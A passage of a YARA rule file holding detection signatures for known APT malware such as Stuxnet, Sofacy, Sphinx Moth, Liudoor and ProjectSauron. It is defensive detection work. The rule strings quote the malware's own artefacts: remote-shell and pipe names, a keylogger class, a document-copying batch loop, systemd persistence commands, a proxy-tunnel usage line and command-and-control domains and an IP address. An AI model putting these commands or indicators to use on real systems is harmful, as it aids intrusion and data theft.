$op3 = { 8b 45 0c 83 38 00 0f 84 98 } /* Opcode */
$op4 = { 89 7e 0c ff 15 a0 50 40 00 59 8b d8 6a 20 59 8d } /* Opcode */
$op5 = { 56 8d 85 cd fc ff ff 53 50 88 9d cc fc ff ff e8 } /* Opcode */
condition:
uint16(0) == 0x5a4d and filesize < 400KB and all of ($x*) and 1 of ($op*)
}
rule SSC_LiuDoor_Malware_2
{
meta:
description = "Liudoor Trojan used in Terracotta APT"
author = "Florian Roth"
reference = "https://blogs.rsa.com/terracotta-vpn-enabler-of-advanced-threat-anonymity/"
date = "2015-08-04"
score = 70
super_rule = 1
hash1 = "f3fb68b21490ded2ae7327271d3412fbbf9d705c8003a195a705c47c98b43800"
hash2 = "e42b8385e1aecd89a94a740a2c7cd5ef157b091fabd52cd6f86e47534ca2863e"
strings:
$s0 = "svchostdllserver.dll" fullword ascii
$s1 = "Lpykh~mzCCRv|mplpykCCHvq{phlCC\\jmmzqkIzmlvpqCC" fullword ascii
condition:
uint16(0) == 0x5a4d and filesize < 100KB and all of them
}
rule SSC_RemoteExec_Tool
{
meta:
description = "Remote Access Tool used in APT Terracotta"
author = "Florian Roth"
reference = "https://blogs.rsa.com/terracotta-vpn-enabler-of-advanced-threat-anonymity/"
date = "2015-08-04"
hash = "a550131e106ff3c703666f15d55d9bc8c816d1cb9ac1b73c2e29f8aa01e53b78"
strings:
$s0 = "cmd.exe /q /c \"%s\"" fullword ascii
$s1 = "\\\\.\\pipe\\%s%s%d" fullword ascii
$s2 = "This is a service executable! Couldn't start directly." fullword ascii
$s3 = "\\\\.\\pipe\\TermHlp_communicaton" fullword ascii
$s4 = "TermHlp_stdout" fullword ascii
$s5 = "TermHlp_stdin" fullword ascii
condition:
uint16(0) == 0x5a4d and filesize < 75KB and 4 of ($s*)
}
rule SSC_Apolmy_Privesc_Trojan
{
meta:
description = "Apolmy Privilege Escalation Trojan used in APT Terracotta"
author = "Florian Roth"
reference = "https://blogs.rsa.com/terracotta-vpn-enabler-of-advanced-threat-anonymity/"
date = "2015-08-04"
score = 80
hash = "d7bd289e6cee228eb46a1be1fcdc3a2bd5251bc1eafb59f8111756777d8f373d"
strings:
$s1 = "[%d] Failed, %08X" fullword ascii
$s2 = "[%d] Offset can not fetched." fullword ascii
$s3 = "PowerShadow2011" fullword wide
condition:
uint16(0) == 0x5a4d and filesize < 300KB and all of them
}
rule SSC_liudoor
{
meta:
author = "RSA FirstWatch"
date = "2015-07-23"
description = "Detects Liudoor daemon backdoor"
hash0 = "78b56bc3edbee3a425c96738760ee406"
hash1 = "5aa0510f6f1b0e48f0303b9a4bfc641e"
hash2 = "531d30c8ee27d62e6fbe855299d0e7de"
hash3 = "2be2ac65fd97ccc97027184f0310f2f3"
hash4 = "6093505c7f7ec25b1934d3657649ef07"
type = "Win32 DLL"
strings:
$string0 = "Succ"
$string1 = "Fail"
$string2 = "pass"
$string3 = "exit"
$string4 = "svchostdllserver.dll"
$string5 = "L$,PQR"
$string6 = "0/0B0H0Q0W0k0"
$string7 = "QSUVWh"
$string8 = "Ht Hu["
condition:
all of them
}
rule SSC_Mithozhan_Trojan
{
meta:
description = "Mitozhan Trojan used in APT Terracotta"
author = "Florian Roth"
reference = "https://blogs.rsa.com/terracotta-vpn-enabler-of-advanced-threat-anonymity/"
date = "2015-08-04"
score = 70
hash = "8553b945e2d4b9f45c438797d6b5e73cfe2899af1f9fd87593af4fd7fb51794a"
strings:
$s1 = "adbrowser" fullword wide
$s2 = "IJKLlGdmaWhram0vn36BgIOChYR3L45xcHNydXQvhmloa2ptbH8voYCDTw==" fullword ascii
$s3 = "EFGHlGdmaWhrL41sf36BgIOCL6R3dk8=" fullword ascii
condition:
uint16(0) == 0x5a4d and filesize < 300KB and all of them
}
rule SSC_LiuDoor_Malware_1
{
meta:
description = "Liudoor Trojan used in Terracotta APT"
author = "Florian Roth"
reference = "https://blogs.rsa.com/terracotta-vpn-enabler-of-advanced-threat-anonymity/"
date = "2015-08-04"
score = 70
super_rule = 1
hash1 = "deed6e2a31349253143d4069613905e1dfc3ad4589f6987388de13e33ac187fc"
hash2 = "4575e7fc8f156d1d499aab5064a4832953cd43795574b4c7b9165cdc92993ce5"
hash3 = "ad1a507709c75fe93708ce9ca1227c5fefa812997ed9104ff9adfec62a3ec2bb"
strings:
$s1 = "svchostdllserver.dll" fullword ascii
$s2 = "SvcHostDLL: RegisterServiceCtrlHandler %S failed" fullword ascii
$s3 = "\\nbtstat.exe" fullword ascii
$s4 = "DataVersionEx" fullword ascii
condition:
uint16(0) == 0x5a4d and filesize < 150KB and all of them
}
rule SSC_Stuxnet_Malware_4
{
meta:
description = "Stuxnet Sample - file 0d8c2bcb575378f6a88d17b5f6ce70e794a264cdc8556c8e812f0b5f9c709198"
author = "Florian Roth"
reference = "Internal Research"
date = "2016-07-09"
hash1 = "0d8c2bcb575378f6a88d17b5f6ce70e794a264cdc8556c8e812f0b5f9c709198"
hash2 = "1635ec04f069ccc8331d01fdf31132a4bc8f6fd3830ac94739df95ee093c555c"
strings:
$x1 = "\\objfre_w2k_x86\\i386\\guava.pdb" ascii
$x2 = "MRxCls.sys" fullword wide
$x3 = "MRXNET.Sys" fullword wide
condition:
( uint16(0) == 0x5a4d and filesize < 80KB and 1 of them ) or ( all of them )
}
rule SSC_Stuxnet_maindll_decrypted_unpacked
{
meta:
description = "Stuxnet Sample - file maindll.decrypted.unpacked.dll_"
author = "Florian Roth"
reference = "Internal Research"
date = "2016-07-09"
hash1 = "4c3d7b38339d7b8adf73eaf85f0eb9fab4420585c6ab6950ebd360428af11712"
strings:
$s1 = "%SystemRoot%\\system32\\Drivers\\mrxsmb.sys;%SystemRoot%\\system32\\Drivers\\*.sys" fullword wide
$s2 = "<Actions Context=\"%s\"><Exec><Command>%s</Command><Arguments>%s,#%u</Arguments></Exec></Actions>" fullword wide
$s3 = "%SystemRoot%\\inf\\oem7A.PNF" fullword wide
$s4 = "%SystemRoot%\\inf\\mdmcpq3.PNF" fullword wide
$s5 = "%SystemRoot%\\inf\\oem6C.PNF" fullword wide
$s6 = "@abf varbinary(4096) EXEC @hr = sp_OACreate 'ADODB.Stream', @aods OUT IF @hr <> 0 GOTO endq EXEC @hr = sp_OASetProperty @" wide
$s7 = "STORAGE#Volume#1&19f7e59c&0&" fullword wide
$s8 = "view MCPVREADVARPERCON as select VARIABLEID,VARIABLETYPEID,FORMATFITTING,SCALEID,VARIABLENAME,ADDRESSPARAMETER,PROTOKOLL,MAXLIMI" ascii
condition:
6 of them
}
rule SSC_Stuxnet_s7hkimdb
{
meta:
description = "Stuxnet Sample - file s7hkimdb.dll"
author = "Florian Roth"
reference = "Internal Research"
date = "2016-07-09"
hash1 = "4071ec265a44d1f0d42ff92b2fa0b30aafa7f6bb2160ed1d0d5372d70ac654bd"
strings:
$x1 = "S7HKIMDX.DLL" fullword wide
/* Opcodes by Binar.ly */
// 0x10001778 8b 45 08  mov     eax, dword ptr [ebp + 8]
// 0x1000177b 35 dd 79 19 ae    xor     eax, 0xae1979dd
// 0x10001780 33 c9     xor     ecx, ecx
// 0x10001782 8b 55 08  mov     edx, dword ptr [ebp + 8]
// 0x10001785 89 02     mov     dword ptr [edx], eax
// 0x10001787 89 ?? ??  mov     dword ptr [edx + 4], ecx
$op1 = { 8b 45 08 35 dd 79 19 ae 33 c9 8b 55 08 89 02 89 }
// 0x10002045 74 36     je      0x1000207d
// 0x10002047 8b 7f 08  mov     edi, dword ptr [edi + 8]
// 0x1000204a 83 ff 00  cmp     edi, 0
// 0x1000204d 74 2e     je      0x1000207d
// 0x1000204f 0f b7 1f  movzx   ebx, word ptr [edi]
// 0x10002052 8b 7f 04  mov     edi, dword ptr [edi + 4]
$op2 = { 74 36 8b 7f 08 83 ff 00 74 2e 0f b7 1f 8b 7f 04 }
// 0x100020cf 74 70     je      0x10002141
// 0x100020d1 81 78 05 8d 54 24 04      cmp     dword ptr [eax + 5], 0x424548d
// 0x100020d8 75 1b     jne     0x100020f5
// 0x100020da 81 78 08 04 cd ?? ??      cmp     dword ptr [eax + 8], 0xc22ecd04
$op3 = { 74 70 81 78 05 8d 54 24 04 75 1b 81 78 08 04 cd }
condition:
( uint16(0) == 0x5a4d and filesize < 40KB and $x1 and all of ($op*) )
}
rule SSC_StuxNet_dll
{
meta:
description = "Stuxnet Sample - file dll.dll"
author = "Florian Roth"
reference = "Internal Research"
date = "2016-07-09"
hash1 = "9e392277f62206098cf794ddebafd2817483cfd57ec03c2e05e7c3c81e72f562"
strings:
$s1 = "SUCKM3 FROM EXPLORER.EXE MOTH4FUCKA #@!" fullword ascii
condition:
uint16(0) == 0x5a4d and filesize < 100KB and $s1
}
rule SSC_Stuxnet_Malware_3
{
meta:
description = "Stuxnet Sample - file ~WTR4141.tmp"
author = "Florian Roth"
reference = "Internal Research"
date = "2016-07-09"
hash1 = "6bcf88251c876ef00b2f32cf97456a3e306c2a263d487b0a50216c6e3cc07c6a"
hash2 = "70f8789b03e38d07584f57581363afa848dd5c3a197f2483c6dfa4f3e7f78b9b"
strings:
$x1 = "SHELL32.DLL.ASLR." fullword wide
$s1 = "~WTR4141.tmp" fullword wide
$s2 = "~WTR4132.tmp" fullword wide
$s3 = "totalcmd.exe" fullword wide
$s4 = "wincmd.exe" fullword wide
$s5 = "http://www.realtek.com0" fullword ascii
$s6 = "{%08x-%08x-%08x-%08x}" fullword wide
condition:
( uint16(0) == 0x5a4d and filesize < 150KB and ( $x1 or 3 of ($s*) ) ) or ( 5 of them )
}
rule SSC_Stuxnet_Shortcut_to
{
meta:
description = "Stuxnet Sample - file Copy of Shortcut to.lnk"
author = "Florian Roth"
reference = "Internal Research"
date = "2016-07-09"
hash1 = "801e3b6d84862163a735502f93b9663be53ccbdd7f12b0707336fecba3a829a2"
strings:
$x1 = "\\\\.\\STORAGE#Volume#_??_USBSTOR#Disk&Ven_Kingston&Prod_DataTraveler_2.0&Rev_PMAP#5B6B098B97BE&0#{53f56307-b6bf-11d0-94f2-00a0c" wide
condition:
uint16(0) == 0x004c and filesize < 10KB and $x1
}
rule SSC_StuxNet_Malware_1
{
meta:
description = "Stuxnet Sample - file malware.exe"
author = "Florian Roth"
reference = "Internal Research"
date = "2016-07-09"
hash1 = "9c891edb5da763398969b6aaa86a5d46971bd28a455b20c2067cb512c9f9a0f8"
strings:
// 0x10001778 8b 45 08  mov     eax, dword ptr [ebp + 8]
// 0x1000177b 35 dd 79 19 ae    xor     eax, 0xae1979dd
// 0x10001780 33 c9     xor     ecx, ecx
// 0x10001782 8b 55 08  mov     edx, dword ptr [ebp + 8]
// 0x10001785 89 02     mov     dword ptr [edx], eax
// 0x10001787 89 ?? ??  mov     dword ptr [edx + 4], ecx
$op1 = { 8b 45 08 35 dd 79 19 ae 33 c9 8b 55 08 89 02 89 }
// 0x10002045 74 36     je      0x1000207d
// 0x10002047 8b 7f 08  mov     edi, dword ptr [edi + 8]
// 0x1000204a 83 ff 00  cmp     edi, 0
// 0x1000204d 74 2e     je      0x1000207d
// 0x1000204f 0f b7 1f  movzx   ebx, word ptr [edi]
// 0x10002052 8b 7f 04  mov     edi, dword ptr [edi + 4]
$op2 = { 74 36 8b 7f 08 83 ff 00 74 2e 0f b7 1f 8b 7f 04 }
// 0x100020cf 74 70     je      0x10002141
// 0x100020d1 81 78 05 8d 54 24 04      cmp     dword ptr [eax + 5], 0x424548d
// 0x100020d8 75 1b     jne     0x100020f5
// 0x100020da 81 78 08 04 cd ?? ??      cmp     dword ptr [eax + 8], 0xc22ecd04
$op3 = { 74 70 81 78 05 8d 54 24 04 75 1b 81 78 08 04 cd }
condition:
all of them
}
rule SSC_Stuxnet_Malware_2
{
meta:
description = "Stuxnet Sample - file 63e6b8136058d7a06dfff4034b4ab17a261cdf398e63868a601f77ddd1b32802"
author = "Florian Roth"
reference = "Internal Research"
date = "2016-07-09"
hash1 = "63e6b8136058d7a06dfff4034b4ab17a261cdf398e63868a601f77ddd1b32802"
strings:
$s1 = "\\SystemRoot\\System32\\hal.dll" fullword wide
$s2 = "http://www.jmicron.co.tw0" fullword ascii
condition:
uint16(0) == 0x5a4d and filesize < 70KB and all of them
}
rule SSC_Sphinx_Moth_nvcplex
{
meta:
description = "sphinx moth threat group file nvcplex.dat"
author = "Kudelski Security - Nagravision SA"
reference = "www.kudelskisecurity.com"
date = "2015-08-06"
strings:
$s0 = "mshtaex.exe" fullword wide
$op0 = { 41 8b cc 44 89 6c 24 28 48 89 7c 24 20 ff 15 d3 } /* Opcode */
$op1 = { 48 3b 0d ad 8f 00 00 74 05 e8 ba f5 ff ff 48 8b } /* Opcode */
$op2 = { 8b ce e8 49 47 00 00 90 8b 43 04 89 05 93 f1 00 } /* Opcode */
condition:
uint16(0) == 0x5a4d and filesize < 214KB and all of them
}
rule SSC_Sphinx_Moth_cudacrt
{
meta:
description = "sphinx moth threat group file cudacrt.dll"
author = "Kudelski Security - Nagravision SA"
reference = "www.kudelskisecurity.com"
date = "2015-08-06"
strings:
$s0 = "HPSSOEx.dll" fullword wide
$s1 = "255.255.255.254" fullword wide
$s2 = "SOFTWARE\\SsoAuth\\Service" fullword wide
$op0 = { ff 15 5f de 00 00 48 8b f8 48 85 c0 75 0d 48 8b } /* Opcode */
$op1 = { 45 33 c9 4c 8d 05 a7 07 00 00 33 d2 33 c9 ff 15 } /* Opcode */
$op2 = { e8 7a 1c 00 00 83 f8 01 74 17 b9 03 } /* Opcode */
condition:
uint16(0) == 0x5a4d and filesize < 243KB and all of ($s*) and 1 of ($op*)
}
rule SSC_Sphinx_Moth_kerberos64
{
meta:
description = "sphinx moth threat group file kerberos64.dll"
author = "Kudelski Security - Nagravision SA (modified by Florian Roth)"
reference = "www.kudelskisecurity.com"
date = "2015-08-06"
strings:
$s0 = "KERBEROS64.dll" fullword ascii
$s1 = "zeSecurityDescriptor" fullword ascii
$s2 = "SpGetInfo" fullword ascii
$s3 = "SpShutdown" fullword ascii
$op0 = { 75 05 e8 6a c7 ff ff 48 8b 1d 47 d6 00 00 33 ff } /* Opcode */
$op1 = { 48 89 05 0c 2b 01 00 c7 05 e2 29 01 00 09 04 00 } /* Opcode */
$op2 = { 48 8d 3d e3 ee 00 00 ba 58 } /* Opcode */
condition:
uint16(0) == 0x5a4d and filesize < 406KB and all of ($s*) and 1 of ($op*)
}
rule SSC_Sphinx_Moth_iastor32
{
meta:
description = "sphinx moth threat group file iastor32.exe"
author = "Kudelski Security - Nagravision SA"
reference = "www.kudelskisecurity.com"
date = "2015-08-06"
strings:
$s0 = "MIIEpQIBAAKCAQEA4lSvv/W1Mkz38Q3z+EzJBZRANzKrlxeE6/UXWL67YtokF2nN" fullword ascii /* private key */
$s1 = "iAeS3CCA4wli6+9CIgX8SAiXd5OezHvI1jza61z/flsqcC1IP//gJVt16nRx3s9z" fullword ascii /* private key */
condition:
uint16(0) == 0x5a4d and filesize < 2000KB and all of them
}
rule SSC_Sphinx_Moth_kerberos32
{
meta:
description = "sphinx moth threat group file kerberos32.dll"
author = "Kudelski Security - Nagravision SA (modified by Florian Roth)"
reference = "www.kudelskisecurity.com"
date = "2015-08-06"
strings:
$x1 = "%WINDIR%\\ativpsrz.bin" fullword ascii
$x2 = "%WINDIR%\\ativpsrn.bin" fullword ascii
$x3 = "kerberos32.dll" fullword wide
$x4 = "KERBEROS64.dll" fullword ascii
$x5 = "kerberos%d.dll" fullword ascii
$s1 = "\\\\.\\pipe\\lsassp" fullword ascii
$s2 = "LSASS secure pipe" fullword ascii /* PEStudio Blacklist: strings */
$s3 = "NullSessionPipes" fullword ascii /* PEStudio Blacklist: strings */
$s4 = "getlog" fullword ascii
$s5 = "startlog" fullword ascii /* PEStudio Blacklist: strings */
$s6 = "stoplog" fullword ascii /* PEStudio Blacklist: strings */
$s7 = "Unsupported OS (%d)" fullword ascii /* PEStudio Blacklist: strings */
$s8 = "Unsupported OS (%s)" fullword ascii /* PEStudio Blacklist: strings */
condition:
uint16(0) == 0x5a4d and filesize < 300KB and (2 of ($x*) or all of ($s*))
}
rule SSC_Sphinx_Moth_h2t
{
meta:
description = "sphinx moth threat group file h2t.dat"
author = "Kudelski Security - Nagravision SA (modified by Florian Roth)"
reference = "www.kudelskisecurity.com"
date = "2015-08-06"
strings:
$x1 = "%s <proxy ip> <proxy port> <target ip> <target port> <cmd> [arg1 cmd] ... [argX cmd]" fullword ascii
$s1 = "[-] Error in connection() %d - %s" fullword ascii
$s2 = "[-] Child process exit." fullword ascii
$s3 = "POST http://%s:%s/ HTTP/1.1" fullword ascii
$s4 = "pipe() to" fullword ascii
$s5 = "pipe() from" fullword ascii
condition:
uint16(0) == 0x5a4d and filesize < 156KB and ($x1 or all of ($s*))
}
rule SSC_Sofacy_Jun16_Sample3
{
meta:
description = "Detects Sofacy Malware mentioned in PaloAltoNetworks APT report"
author = "Florian Roth"
reference = "http://goo.gl/mzAa97"
date = "2016-06-14"
score = 85
hash1 = "c2551c4e6521ac72982cb952503a2e6f016356e02ee31dea36c713141d4f3785"
strings:
$s1 = "ASLIiasiuqpssuqkl713h" fullword wide
condition:
uint16(0) == 0x5a4d and filesize < 200KB and $s1
}
rule SSC_Sofacy_Jun16_Sample2
{
meta:
description = "Detects Sofacy Malware mentioned in PaloAltoNetworks APT report"
author = "Florian Roth"
reference = "http://goo.gl/mzAa97"
date = "2016-06-14"
score = 85
hash1 = "57d230ddaf92e2d0504e5bb12abf52062114fb8980c5ecc413116b1d6ffedf1b"
hash2 = "69940a20ab9abb31a03fcefe6de92a16ed474bbdff3288498851afc12a834261"
hash3 = "aeeab3272a2ed2157ebf67f74c00fafc787a2b9bbaa17a03be1e23d4cb273632"
strings:
$x1 = "DGMNOEP" fullword ascii
$x2 = "/%s%s%s/?%s=" fullword ascii
$s1 = "Control Panel\\Dehttps=https://%snetwork.proxy.ht2" fullword ascii
$s2 = "http=http://%s:%Control Panel\\Denetwork.proxy.ht&ol1mS9" fullword ascii
$s3 = "svchost.dll" fullword wide
$s4 = "clconfig.dll" fullword wide
condition:
( uint16(0) == 0x5a4d and filesize < 100KB and ( all of ($x*) ) ) or ( 3 of them )
}
rule SSC_Sofacy_Jun16_Sample1
{
meta:
description = "Detects Sofacy Malware mentioned in PaloAltoNetworks APT report"
author = "Florian Roth"
reference = "http://goo.gl/mzAa97"
date = "2016-06-14"
score = 85
hash1 = "be1cfa10fcf2668ae01b98579b345ebe87dab77b6b1581c368d1aba9fd2f10a0"
strings:
$s1 = "clconfg.dll" fullword ascii
$s2 = "ASijnoKGszdpodPPiaoaghj8127391" fullword wide
condition:
( uint16(0) == 0x5a4d and filesize < 200KB and ( 1 of ($s*) ) ) or ( all of them )
}
rule SSC_Sofacy_Fybis_ELF_Backdoor_Gen1
{
meta:
description = "Detects Sofacy Fysbis Linux Backdoor_Naikon_APT_Sample1"
author = "Florian Roth"
reference = "http://researchcenter.paloaltonetworks.com/2016/02/a-look-into-fysbis-sofacys-linux-backdoor/"
date = "2016-02-13"
score = 80
hash1 = "02c7cf55fd5c5809ce2dce56085ba43795f2480423a4256537bfdfda0df85592"
hash2 = "8bca0031f3b691421cb15f9c6e71ce193355d2d8cf2b190438b6962761d0c6bb"
strings:
$x1 = "Your command not writed to pipe" fullword ascii
$x2 = "Terminal don`t started for executing command" fullword ascii
$x3 = "Command will have end with \\n" fullword ascii
$s1 = "WantedBy=multi-user.target' >> /usr/lib/systemd/system/" fullword ascii
$s2 = "Success execute command or long for waiting executing your command" fullword ascii
$s3 = "ls /etc | egrep -e\"fedora*|debian*|gentoo*|mandriva*|mandrake*|meego*|redhat*|lsb-*|sun-*|SUSE*|release\"" fullword ascii
$s4 = "rm -f /usr/lib/systemd/system/" fullword ascii
$s5 = "ExecStart=" fullword ascii
$s6 = "<table><caption><font size=4 color=red>TABLE EXECUTE FILES</font></caption>" fullword ascii
condition:
( uint16(0) == 0x457f and filesize < 500KB and 1 of ($x*) ) or ( 1 of ($x*) and 3 of ($s*) )
}
rule SSC_Sofacy_Fysbis_ELF_Backdoor_Gen2
{
meta:
description = "Detects Sofacy Fysbis Linux Backdoor"
author = "Florian Roth"
reference = "http://researchcenter.paloaltonetworks.com/2016/02/a-look-into-fysbis-sofacys-linux-backdoor/"
date = "2016-02-13"
score = 80
hash1 = "02c7cf55fd5c5809ce2dce56085ba43795f2480423a4256537bfdfda0df85592"
hash2 = "8bca0031f3b691421cb15f9c6e71ce193355d2d8cf2b190438b6962761d0c6bb"
hash3 = "fd8b2ea9a2e8a67e4cb3904b49c789d57ed9b1ce5bebfe54fe3d98214d6a0f61"
strings:
$s1 = "RemoteShell" ascii
$s2 = "basic_string::_M_replace_dispatch" fullword ascii
$s3 = "HttpChannel" ascii
condition:
uint16(0) == 0x457f and filesize < 500KB and all of them
}
rule SSC_apt_sofacy_xtunnel
{
meta:
author = "Claudio Guarnieri"
strings:
$xaps = ":\\PROJECT\\XAPS_"
$variant11 = "XAPS_OBJECTIVE.dll"
$variant12 = "start"
$variant21 = "User-Agent: Mozilla/5.0 (Windows NT 6.3;"
$variant22 = "is you live?"
$mix1 = "176.31.112.10"
$mix2 = "error in select, errno %d"
$mix3 = "no msg"
$mix4 = "is you live?"
$mix5 = "127.0.0.1"
$mix6 = "err %d"
$mix7 = "i`m wait"
$mix8 = "hello"
$mix9 = "OpenSSL 1.0.1e 11 Feb 2013"
$mix10 = "Xtunnel.exe"
condition:
((uint16(0) == 0x5A4D) or (uint16(0) == 0xCFD0)) and
(($xaps) or (all of ($variant1*)) or (all of ($variant2*))
or (6 of ($mix*)))
}
rule SSC_Sofacy_Bundestag_Mal3
{
meta:
description = "Sofacy Group Malware Sample 3"
author = "Florian Roth"
reference = "http://dokumente.linksfraktion.de/inhalt/report-orig.pdf"
date = "2015-06-19"
hash = "5f6b2a0d1d966fc4f1ed292b46240767f4acb06c13512b0061b434ae2a692fa1"
score = 70
strings:
$s1 = "shell\\open\\command=\"System Volume Information\\USBGuard.exe\" install" fullword ascii
$s2 = ".?AVAgentModuleRemoteKeyLogger@@" fullword ascii
$s3 = "<font size=4 color=red>process isn't exist</font>" fullword ascii
$s4 = "<font size=4 color=red>process is exist</font>" fullword ascii
$s5 = ".winnt.check-fix.com" fullword ascii
$s6 = ".update.adobeincorp.com" fullword ascii
$s7 = ".microsoft.checkwinframe.com" fullword ascii
$s8 = "adobeincorp.com" fullword wide
$s9 = "# EXC: HttpSender - Cannot create Get Channel!" fullword ascii
$x1 = "User-Agent: Mozilla/5.0 (Windows NT 6.2; WOW64; rv:20.0) Gecko/20100101 Firefox/" wide
$x2 = "User-Agent: Mozilla/5.0 (Windows NT 6.; WOW64; rv:20.0) Gecko/20100101 Firefox/2" wide
$x3 = "C:\\Windows\\System32\\cmd.exe" fullword wide
condition:
uint16(0) == 0x5a4d and filesize < 300KB and ( 2 of ($s*) or ( 1 of ($s*) and all of ($x*) ))
}
rule SSC_Sofacy_Bundestag_Batch
{
meta:
description = "Sofacy Bundestags APT Batch Script"
author = "Florian Roth"
reference = "http://dokumente.linksfraktion.de/inhalt/report-orig.pdf"
date = "2015-06-19"
score = 70
strings:
$s1 = "for %%G in (.pdf, .xls, .xlsx, .doc, .docx) do (" ascii
$s2 = "cmd /c copy"
$s3 = "forfiles"
condition:
filesize < 10KB and all of them
}
rule SSC_Sofacy_Bundestag_Mal2
{
meta:
description = "Sofacy Group Malware Sample 2"
author = "Florian Roth"
reference = "http://dokumente.linksfraktion.de/inhalt/report-orig.pdf"
date = "2015-06-19"
hash = "566ab945f61be016bfd9e83cc1b64f783b9b8deb891e6d504d3442bc8281b092"
score = 70
strings:
$x1 = "PROJECT\\XAPS_OBJECTIVE_DLL\\" ascii
$x2 = "XAPS_OBJECTIVE.dll" fullword ascii
$s1 = "i`m wait" fullword ascii
condition:
uint16(0) == 0x5a4d and ( 1 of ($x*) ) and $s1
}
rule SSC_Sofacy_Bundestag_Winexe
{
meta:
description = "Winexe tool used by Sofacy group in Bundestag APT"
author = "Florian Roth"
reference = "http://dokumente.linksfraktion.de/inhalt/report-orig.pdf"
date = "2015-06-19"
hash = "5130f600cd9a9cdc82d4bad938b20cbd2f699aadb76e7f3f1a93602330d9997d"
score = 70
strings:
$s1 = "\\\\.\\pipe\\ahexec" fullword ascii
$s2 = "implevel" fullword ascii
condition:
uint16(0) == 0x5a4d and filesize < 115KB and all of them
}
rule SSC_ramFS
{
meta:
Author      = "Joan Calvet"
Date        = "2015/07/14"
Description = "RamFS -- custom file system used by Animal Farm malware"
Reference   = "http://www.welivesecurity.com/2015/06/30/dino-spying-malware-analyzed/"
Source = "https://github.com/eset/malware-ioc/"
Contact = "github@eset.com"
License = "BSD 2-Clause"
strings:
$mz = { 4d 5a }
// Debug strings in RamFS
$s01 = "Check: Error in File_List"
$s02 = "Check: Error in FreeFileHeader_List"
$s03 = "CD-->[%s]"
$s04 = "!!!EXTRACT ERROR!!!File Does Not Exists-->[%s]"
// RamFS parameters stored in the configuration
$s05 = "tr4qa589" fullword
$s06 = "xT0rvwz" fullword
// RamFS commands
$c01 = "INSTALL" fullword
$c02 = "EXTRACT" fullword
$c03 = "DELETE" fullword
$c04 = "EXEC" fullword
$c05 = "INJECT" fullword
$c06 = "SLEEP" fullword
$c07 = "KILL" fullword
$c08 = "AUTODEL" fullword
$c09 = "CD" fullword
$c10 = "MD" fullword
condition:
( $mz at 0 ) and
((1 of ($s*)) or (all of ($c*)))
}
rule SSC_dino
{
meta:
Author      = "Joan Calvet"
Date        = "2015/07/14"
Description = "Dino backdoor"
Reference   = "http://www.welivesecurity.com/2015/06/30/dino-spying-malware-analyzed/"
Source = "https://github.com/eset/malware-ioc/"
Contact = "github@eset.com"
License = "BSD 2-Clause"
strings:
$ = "PsmIsANiceM0du1eWith0SugarInsideA"
$ = "destroyPSM"
$ = "FM_PENDING_DOWN_%X"
$ = "%s was canceled after %d try (reached MaxTry parameter)"
$ = "you forgot value name"
$ = "wakeup successfully scheduled in %d minutes"
$ = "BD started at %s"
$ = "decyphering failed on bd"
condition:
any of them
}
rule SSC_SNOWGLOBE_Babar_Malware
{
meta:
description = "Detects the Babar Malware used in the SNOWGLOBE attacks - file babar.exe"
author = "Florian Roth"
reference = "http://motherboard.vice.com/read/meet-babar-a-new-malware-almost-certainly-created-by-france"
date = "2015/02/18"
hash = "27a0a98053f3eed82a51cdefbdfec7bb948e1f36"
score = 80
strings:
$mz = { 4d 5a }
$z0 = "admin\\Desktop\\Babar64\\Babar64\\obj\\DllWrapper" ascii fullword
$z1 = "User-Agent: Mozilla/4.0 (compatible; MSI 6.0;" ascii fullword
$z2 = "ExecQueryFailled!" fullword ascii
$z3 = "NBOT_COMMAND_LINE" fullword
$z4 = "!!!EXTRACT ERROR!!!File Does Not Exists-->[%s]" fullword
$s1 = "/s /n %s \"%s\"" fullword ascii
$s2 = "%%WINDIR%%\\%s\\%s" fullword ascii
$s3 = "/c start /wait " fullword ascii
$s4 = "(D;OICI;FA;;;AN)(A;OICI;FA;;;BG)(A;OICI;FA;;;SY)(A;OICI;FA;;;LS)" ascii
$x1 = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\" fullword ascii
$x2 = "%COMMON_APPDATA%" fullword ascii
$x4 = "CONOUT$" fullword ascii
$x5 = "cmd.exe" fullword ascii
$x6 = "DLLPATH" fullword ascii
condition:
( $mz at 0 ) and filesize < 1MB and (( 1 of ($z*) and 1 of ($x*) ) or ( 3 of ($s*) and 4 of ($x*) ) )
}
rule SSC_StoneDrill_main_sub {
meta:
author = "Kaspersky Lab"
description = "Rule to detect StoneDrill (decrypted) samples"
hash = "d01781f1246fd1b64e09170bd6600fe1"
hash = "ac3c25534c076623192b9381f926ba0d"
version = "1.0"
strings:
$code = {B8 08 00 FE 7F FF 30 8F 44 24 ?? 68 B4 0F 00 00 FF 15 ?? ?? ?? 00 B8 08 00 FE 7F FF
30 8F 44 24 ?? 8B ?? 24 [1 - 4] 2B ?? 24 [6] F7 ?1 [5 - 12] 00}
condition:
uint16(0) == 0x5A4D and
$code and
filesize < 5000000
}
rule SSC_SeaDuke_Sample
{
meta:
description = "SeaDuke Malware - file 3eb86b7b067c296ef53e4857a74e09f12c2b84b666fc130d1f58aec18bc74b0d"
author = "Florian Roth"
reference = "http://goo.gl/MJ0c2M"
date = "2015-07-14"
score = 70
hash = "d2e570129a12a47231a1ecb8176fa88a1bf415c51dabd885c513d98b15f75d4e"
strings:
$s0 = "bpython27.dll" fullword ascii
$s1 = "email.header(" fullword ascii /* PEStudio Blacklist: strings */
$s2 = "LogonUI.exe" fullword wide /* PEStudio Blacklist: strings */
$s3 = "Crypto.Cipher.AES(" fullword ascii /* PEStudio Blacklist: strings */
$s4 = "mod is NULL - %s" fullword ascii
condition:
uint16(0) == 0x5a4d and filesize < 4000KB and all of them
}
rule SSC_apt_ProjectSauron_encryption
{
meta:
copyright = "Kaspersky Lab"
description = "Rule to detect ProjectSauron string encryption"
version = "1.0"
reference = "https://securelist.com/blog/"
strings:
$a1 = {81??02AA02C175??8B??0685}
$a2 = {918D9A94CDCC939A93939BD18B9AB8DE9C908DAF8D9B9BBE8C8C9AFF}
$a3 = {803E225775??807E019F75??807E02BE75??807E0309}
condition:
filesize < 5000000 and any of ($a*)
}
rule SSC_apt_ProjectSauron_generic_pipe_backdoor
{
meta:
copyright = "Kaspersky Lab"
description = "Rule to detect ProjectSauron generic pipe backdoors"
version = "1.0"
reference = "https://securelist.com/blog/"
strings:
$a = { C7 [2-3] 32 32 32 32 E8 }
$b = { 42 12 67 6B }
$c = { 25 31 5F 73 }
$d = "rand"
$e = "WS2_32"
condition:
uint16(0) == 0x5A4D and (all of them) and filesize < 400000
}
rule SSC_apt_ProjectSauron_MyTrampoline
{
